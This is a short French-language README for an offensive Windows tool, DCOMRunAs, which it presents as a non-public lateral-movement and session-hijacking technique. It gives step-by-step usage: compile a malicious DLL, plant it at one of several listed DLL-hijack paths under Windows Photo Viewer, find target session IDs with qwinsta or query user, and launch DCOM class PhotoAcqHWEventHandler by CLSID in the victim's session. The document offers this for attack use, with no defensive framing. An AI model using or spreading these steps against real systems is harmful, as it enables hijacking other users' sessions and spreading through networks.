# DCOMRunAs

DCOMRunAs est une nouvelle méthode de mouvement latéral et de vol de session, non publique. Elle repose sur l'instantiation de classes DCOM dans la sessions d'utilisateurs connectés sur une machine, classes DCOM chargeant une DLL non existante à un endroit du disque inscriptible.

## How

1. Compiler une DLL malveillante qui effectuera les actions que vous voulez faire faire à l'utilisateur cible.

2. La nommer et la déposer à l'endroit adéquat sur le disque de la machine cible.

3. Trouver l'identifiant de session correspondant à l'utilsateur souhaité. Lancer une de ces commandes à distance, dans un `runas /netonly` :

```
qwinsta /server:<remote_host>
query user /server:<remote_host>
```

4. Lancer l'outil avec le bon CLSID et le bon identifiant de session:

```
C:\> DCOMRunAs.exe <sess_id> <CLSID> [remote_host_if_remote]
```

## CLSID utilisables

* `00F2B433-44E4-4D88-B2B0-2698A0A91DBA` (PhotoAcqHWEventHandler)
    * Placer la DLL au endroits suivants :
	    * `C:\Program Files\Windows Photo Viewer\OLEACC.dll`
	    * `C:\Program Files\Windows Photo Viewer\PROPSYS.dll`
	    * `C:\Program Files\Windows Photo Viewer\STI.dll`
	    * `C:\Program Files\Windows Photo Viewer\WINMM.dll`
	    * `C:\Program Files\Windows Photo Viewer\dwmapi.dll`
	    * `C:\Program Files\Windows Photo Viewer\UxTheme.dll`
	    * `C:\Program Files\Windows Photo Viewer\VERSION.dll`

